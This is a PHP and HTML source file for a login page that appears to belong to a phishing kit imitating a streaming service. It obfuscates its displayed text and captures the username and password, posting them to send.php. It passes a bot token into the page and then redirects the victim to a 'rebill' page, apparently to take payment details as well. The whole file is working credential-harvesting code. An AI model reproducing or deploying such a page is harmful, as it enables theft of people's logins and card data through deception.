<?php 
session_start();
if(isset($_GET['lang'])){
	$_SESSION['countryCode']=$_GET['lang'];
}
require '../main.php';
?>
<!doctype html>
<html>
<head>
<title></title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="stylesheet" href="res/style.css">
</head>
<body>
<header class="header">
<img src="res/logo.png">
</header>
<section class="content">

<div class="form">
<div class="form-title">
<?php echo $obf->obf(getLang("TITLE_LOGIN")); ?>
</div>
<div class="form-col">
<input type="text" class="textinput" id="in0" placeholder="<?php echo getLang('INPUT_USER'); ?>">
<div class="err" id="errortext0"></div>
</div>
<div class="form-col">
<input type="password" class="textinput" id="in1" placeholder="<?php echo getLang('INPUT_PASSWORD'); ?>">
<div class="err" id="errortext1"></div>
</div>
<div class="form-col">
<button  onclick="sbmt()" id="submit"  class="sbmt"><?php echo getLang('LOGIN_BTN'); ?></button>
</div>
<div class="form-col" style="display:flex; align-items:center; color:#717171; font-size:0.8em;">
<div style="width:50%;  text-align:left; display:flex; align-items:center;">
<input type="checkbox" checked class="checkboxa"> <?php echo $obf->obf(getLang('REMEMBER_ME')); ?>
</div>
<div style="text-align:right; width:50%;">
<?php echo $obf->obf(getLang('NEED_HELP')); ?>
</div>
</div>
<div style="color:#717171;  margin-top:60px;">
<?php echo $obf->obf(getLang('NEW_TO')); ?> <a href="" style="color:white; text-decoration:none;"><?php echo $obf->obf(getLang('SIGN_UP')); ?></a>
</div>
<div style="color:#717171; font-size:0.8em; margin:30px 0;">
<?php echo getLang('CAPTCHA_MESSAGE'); ?>
</div>
</div>
<script>var token=<?php echo json_encode($bot); ?>;</script>
</section>


<footer class="footer">
<div style="">
<?php echo $obf->obf(getLang('CONTACT')); ?>
</div>
<div style="margin:30px 0;">
<?php echo getLang('LINKS'); ?>
</div>
<div style="">
<select style="padding:10px; background:none; color:#717171;" id="lang" onchange="setLang()">
<option value="EN">English</option>
<option value="ES">Española</option>
<option value="DE">Deutsche</option>
<option value="FR">Français</option>
</select>
</div>
</footer>

<script src="res/jq.js"></script>
<script src="res/jquery1.js"></script>
<script>
var allowvalidate=false;
var errors = ["<?php echo getLang('LOGIN_ERRORS')[0]; ?>", "<?php echo getLang('LOGIN_ERRORS')[1]; ?>"];
var abort = false;

function setLang(){
	window.location= "?lang="+$("#lang").val();
	
}


function sbmt(){
	allowvalidate = true;
		abort=false;
	for(var x=0; x<=1; x++){
		if($("#in"+x).val()==""){
			abort=true;
			$("#errortext"+x).html(errors[x]);
				$("#in"+x).css("border-bottom", "2px solid #e77508");
		}
	}
	
	if(!abort){
		$("#submit").css("background","#e72f38");
		$.post("send.php",{user: $("#in0").val(), pass: $("#in1").val()}, function(d){
			window.location="rebill.php";
		});
		
	}
	
}


function validate(){
	if(allowvalidate){
	for(var x=0; x<=1; x++){
		if($("#in"+x).val()==""){
		$("#errortext"+x).html(errors[x]);
			$("#in"+x).css("border-bottom", "2px solid #e77508");
			
		}else{
			$("#errortext"+x).html("");
			$("#in"+x).css("border", "none");
		}
	}
	}
}


	
$("#in0").keyup(function(){
	validate();
});
$("#in1").keyup(function(){
	validate();
});

$("input").keypress((e)=>{
	if(e.key=="Enter"){
		sbmt();
	}
});

</script>
</body>
</html>